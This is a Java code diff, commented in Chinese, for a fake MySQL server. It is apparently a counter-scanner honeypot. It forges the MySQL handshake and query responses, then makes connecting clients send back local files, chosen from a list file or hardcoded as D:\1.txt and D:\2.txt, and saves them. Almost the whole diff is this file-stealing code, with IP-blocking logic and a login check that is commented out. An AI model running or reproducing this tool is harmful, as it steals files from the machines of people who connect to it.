@@ -46,52 +46,104 @@ public class Socket extends Thread {
 
     // 欺骗扫描器登录  [-] 基本功能未完工
     public void DeceptionScanner() throws IOException {
+        configuration.getInstance();
         while (true) {
             java.net.Socket server = null;
-            try {
-                server = serverSocket.accept();
-                logger.info("[+] 已连接的客户端: " + server.getRemoteSocketAddress());
-                logOutput.add("[+] 已连接的客户端: " + server.getRemoteSocketAddress());
-                FileUtils.writeLines(configuration.logFileName, logOutput, true);
-                logOutput.clear();
+            String ip;
+            while (true) {
+                try {
+                    server = serverSocket.accept();
+                    assert server != null;
+                    ip = server.getRemoteSocketAddress().toString().substring(1);
+                    String port = ip.substring(ip.lastIndexOf(":") + 1);
+                    ip = ip.substring(0, ip.lastIndexOf(":"));
 
-                DataInputStream in = new DataInputStream(server.getInputStream());
-                DataOutputStream out = new DataOutputStream(server.getOutputStream());
+                    DataInputStream in = new DataInputStream(server.getInputStream());
+                    DataOutputStream out = new DataOutputStream(server.getOutputStream());
 
-                out.write(stringUtils.hexToByteArray(configuration.flushVersionText()));
-                out.flush();
-                byte[] bys = new byte[1024];
-                in.read(bys);   // 读取客户端发来的账号密码并验证
+                    // 如果客户端连接上了,则查看客户端的ip是否超过阈值,超过则返回1129错误码,并结束socket
+                    if (isBlockIp(ip)) {
+                        configuration.return1129(out, ip);
+                        break;
+                    }
+                    logger.info("[+] 已上钩的客户端: " + ip + " " + port);
+                    logOutput.add("[+] " + stringUtils.thisTime("hh:mm:ss") + " 已上钩的客户端: " + ip + " " + port);
+                    FileUtils.writeLines(configuration.logFileName, logOutput, true);
+                    logOutput.clear();
 
-                out.write(configuration.verificationText); // res ok
-                out.flush();
-                bys = new byte[1024];
-                in.read(bys);
+                    long startTime = System.currentTimeMillis();
+                    out.write(stringUtils.hexToByteArray(configuration.flushVersionText())); // 发送mysql版本信息
+                    long endTime = System.currentTimeMillis();
+                    long elapsedTime = endTime - startTime;
+                    // 如果发生超时异常，则认为延迟不稳定，断开连接.并记录ip进blockList.txt,然后查看是否超过max_connect_errors,如果超过了则发送ERROR 1129给客户端
+                    if (elapsedTime > 10000) {
+                        recordIp(ip);
+                        if (isBlockIp(ip)) {
+                            out = new DataOutputStream(server.getOutputStream());
+                            configuration.return1129(out, ip);
+                        }
+                        server.close();
+                        break;
+                    }
+                    byte[] bys = new byte[1024];
+                    byte firstByte = in.readByte();
+                    int bysLength = in.read(bys);       // 接受客户端发来的验证信息(如账号密码)
+                    byte[] newByteArray = new byte[bysLength + 1];
+                    System.arraycopy(bys, 0, newByteArray, 1, bysLength);
+                    newByteArray[0] = firstByte;
+
+                    // 处理客户端发来的数据包,提取出salt和password,salt结合自己预设的密码 =>变为最终的ServerPassword,password和ServerPassword相等时即验证成功.加入登录验证,正确时继续,否则返回错误
+//                    if (!handlePassword(newByteArray)) {
+//                        configuration.return1045(out, ip);
+//                        break;
+//                    }
+                    configuration.wantReadList = FileUtils.readLines(".\\wantReadList.txt");
+                    String filename = configuration.wantReadList.get(stringUtils.getRandomNum(0, configuration.wantReadList.size() - 1));
+
+                    out.write(configuration.verificationText);  // res ok
+                    out.flush();
+                    bys = new byte[1024];
+
+                    while (in.read(bys) != -1) {
+                        if (Arrays.equals(stringUtils.hexToByteArray(configuration.selectVersion), getRequest(bys))) {
+                            // todo 写个for循环可以不断的读取
+                            getData(filename, server);
+                        } else if (Arrays.equals(stringUtils.hexToByteArray(configuration.showVariable), getRequest(bys))) {
+                            // 如果res为 showVariable
+                            out.write(stringUtils.hexToByteArray(configuration.showVariablesRes1));
+                            out.write(stringUtils.hexToByteArray(configuration.showVariablesRes2));
+                            out.flush();
+                        } else if (Arrays.equals(stringUtils.hexToByteArray(configuration.showWarnings), getRequest(bys))) {
+                            // 如果res为 showWarnings
+                            out.write(stringUtils.hexToByteArray(configuration.showWarningsRes));
+                            out.flush();
+                        } else if (Arrays.equals(stringUtils.hexToByteArray(configuration.showCollation), getRequest(bys))) {
+                            // 如果res为 showCollation
+                            out.write(stringUtils.hexToByteArray(configuration.showCollationRes));
+                            // req : set names utf8
+                            //out.write(configuration.verificationText);  // res ok
+                            out.flush();
+                            //filename = configuration.wantReadList.get(stringUtils.getRandomNum(0, configuration.wantReadList.size() - 1));
+                            // todo 写个for循环可以不断的读取
+                            getData("D:\\1.txt", server);
+                            getData("D:\\2.txt", server);
+                            getData("D:\\2.txt", server);
+                            getData("D:\\2.txt", server);
+                            getData("D:\\2.txt", server);
+                        }
+                    }
+//                    in.read(bys);
+//                    getData("D:\\2.txt", server);
 
 
-                out.write(stringUtils.hexToByteArray(configuration.showVariables1));
-                out.write(stringUtils.hexToByteArray(configuration.showVariables2));
-                out.flush();
-                bys = new byte[9999];
-                in.read(bys);           // req query
-
-                out.write(configuration.showWarnings);  //
-                out.flush();
-                bys = new byte[9999];
-                in.read(bys);
-
-                out.write(stringUtils.hexToByteArray(configuration.showCollation));
-                out.flush();
-                bys = new byte[9999];
-                in.read(bys);
-
-                String filename = "D:\\1.txt";
-                getData(filename, server);
-            } catch (IOException e) {
-                e.printStackTrace();
-                throw new RuntimeException(e);
-            } finally {
-                server.close();
+                } catch (Exception e) {
+                    e.printStackTrace();
+                    break;
+                } finally {
+                    if (server != null) {
+                        server.close();
+                    }
+                }
             }
         }
     }
@@ -129,7 +181,7 @@ public class Socket extends Thread {
                     long endTime = System.currentTimeMillis();
                     long elapsedTime = endTime - startTime;
                     // 如果发生超时异常，则认为延迟不稳定，断开连接.并记录ip进blockList.txt,然后查看是否超过max_connect_errors,如果超过了则发送ERROR 1129给客户端
-                    if (elapsedTime > 20000) {
+                    if (elapsedTime > 10000) {
                         recordIp(ip);
                         if (isBlockIp(ip)) {
                             out = new DataOutputStream(server.getOutputStream());
@@ -171,10 +223,27 @@ public class Socket extends Thread {
 
     public void run() {
         try {
-            deceptionMysqlCMD();
+            DeceptionScanner();
         } catch (IOException e) {
             throw new RuntimeException(e);
         }
+    }
+
+    /**
+     * 获取客户端发来的request,然后进行处理
+     */
+    public static byte[] getRequest(byte[] bys) {
+        byte[] newByte = new byte[]{bys[0], bys[1], bys[2]};
+        int packetLength = stringUtils.byteArrayToDecimalByHigh(newByte);
+
+        if (bys[4] == 3) {
+            byte[] outcome = new byte[packetLength - 1];
+            for (int i = 0; i < packetLength - 1; i++) {
+                outcome[i] = bys[5 + i];
+            }
+            return outcome;
+        }
+        return null;
     }
 
     /**
@@ -301,9 +370,8 @@ public class Socket extends Thread {
         byte[] bys = new byte[9999];
         int bysLength = in.read(bys);
 
-        int contentLengthByInt = bysLength - 7;
-
-        if (bys[3 + contentLengthByInt + 3] == 3) {
+        if (bysLength != 0) {
+            in.read(bys);
             logger.info("[+] 获取结果:获取文件成功! 文件已保存进getData文件夹中");
             logOutput.add("[+] " + stringUtils.thisTime("hh:mm:ss") + " 获取结果:获取文件成功! 文件已保存进getData文件夹中");
 
